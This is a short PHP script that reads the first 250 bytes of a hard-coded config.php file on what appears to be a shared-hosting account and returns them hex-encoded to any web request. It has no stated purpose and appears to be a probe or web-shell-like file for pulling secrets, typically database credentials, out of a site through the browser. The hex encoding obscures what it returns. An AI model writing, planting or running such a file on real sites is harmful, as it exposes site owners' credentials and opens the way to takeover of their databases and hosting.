<?php
header('Content-Type: text/plain');

$path = '/home/u869064717/config.php';

$handle = @fopen($path, 'r');
if (!$handle) {
    echo "ERROR_OPEN_FAILED";
    exit;
}

$content = @fread($handle, 250);
fclose($handle);

if ($content === false) {
    echo "ERROR_READ_FAILED";
    exit;
}

echo bin2hex($content);
exit;
